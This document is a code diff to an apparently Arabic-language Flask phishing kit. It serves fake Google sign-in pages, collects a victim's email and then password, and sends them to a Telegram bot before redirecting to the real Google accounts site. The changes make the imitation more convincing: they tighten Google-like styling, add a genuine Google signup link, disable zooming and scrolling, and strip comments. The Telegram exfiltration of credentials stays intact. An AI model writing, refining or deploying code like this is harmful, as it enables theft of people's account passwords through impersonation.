@@ -12,7 +12,7 @@ CHAT_ID = os.getenv("CHAT_ID")
 GOOGLE_OFFICIAL_URL = "https://accounts.google.com/"
 
 
-# الصفحة الأولى: إدخال البريد الإلكتروني أو الهاتف
+# الصفحة الأولى: إدخال البريد الإلكتروني أو الهاتف مع خيار إنشاء حساب
 @app.route("/", methods=["GET", "POST"])
 def step1():
   error = ""
@@ -30,7 +30,6 @@ def step1():
           " الإلكتروني."
       )
     else:
-      # حفظ الإيميل في الجلسة للانتقال للصفحة التالية
       session["user_email"] = email_val
       return redirect(url_for("step2"))
 
@@ -40,11 +39,20 @@ def step1():
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
-        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        html, body { 
+            background: #fff; 
+            width: 100vw; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+        }
         
         .login-container {
             width: 100%;
@@ -58,13 +66,13 @@ def step1():
         }
 
         .google-g {
-            width: 48px;
-            height: 48px;
+            width: 44px;
+            height: 44px;
             margin-bottom: 16px;
         }
 
         .title { font-size: 24px; font-weight: 400; color: #202124; margin-bottom: 8px; }
-        .subtitle { font-size: 15px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
+        .subtitle { font-size: 14.5px; color: #5f6368; margin-bottom: 24px; line-height: 1.5; }
 
         .error-msg { 
             color: #d93025; 
@@ -79,7 +87,7 @@ def step1():
             border: 1px solid #fad2cf; 
         }
 
-        .input-group { width: 100%; margin-bottom: 15px; }
+        .input-group { width: 100%; margin-bottom: 6px; }
         .input-group input {
             width: 100%;
             padding: 16px 14px;
@@ -92,19 +100,21 @@ def step1():
         }
         .input-group input:focus { border-color: #1a73e8; border-width: 2px; padding: 15px 13px; }
 
-        .links-row {
+        .links-container {
             width: 100%;
             display: flex;
-            justify-content: flex-start;
+            justify-content: space-between;
+            align-items: center;
             margin-bottom: 30px;
+            padding: 0 2px;
         }
-        .links-row a {
+        .links-container a {
             color: #1a73e8;
             font-size: 14px;
             text-decoration: none;
             font-weight: 500;
         }
-        .links-row a:hover { text-decoration: underline; }
+        .links-container a:hover { text-decoration: underline; }
 
         .submit-btn {
             width: 100%;
@@ -140,9 +150,12 @@ def step1():
             <div class="input-group">
                 <input type="text" name="email" required placeholder="البريد الإلكتروني أو الهاتف">
             </div>
-            <div class="links-row">
+            
+            <div class="links-container">
                 <a href="#">هل نسيت بريدك الإلكتروني؟</a>
+                <a href="https://accounts.google.com/signup" target="_blank">إنشاء حساب</a>
             </div>
+
             <button type="submit" class="submit-btn">التالي</button>
         </form>
     </div>
@@ -153,7 +166,7 @@ def step1():
   )
 
 
-# الصفحة الثانية: إدخال كلمة المرور
+# الصفحة الثانية: إدخال كلمة المرور مع منع التمرير
 @app.route("/step2", methods=["GET", "POST"])
 def step2():
   user_email = session.get("user_email", "")
@@ -175,7 +188,6 @@ def step2():
         telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
         requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
 
-      # مسح الجلسة والتحويل لموقع جوجل الرسمي
       session.pop("user_email", None)
       return redirect(GOOGLE_OFFICIAL_URL)
 
@@ -185,11 +197,20 @@ def step2():
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>تسجيل الدخول - حسابات Google</title>
     <style>
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; }
-        body { background: #fff; width: 100vw; height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center; }
+        html, body { 
+            background: #fff; 
+            width: 100vw; 
+            height: 100vh; 
+            overflow: hidden; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+            align-items: center; 
+        }
         
         .login-container {
             width: 100%;
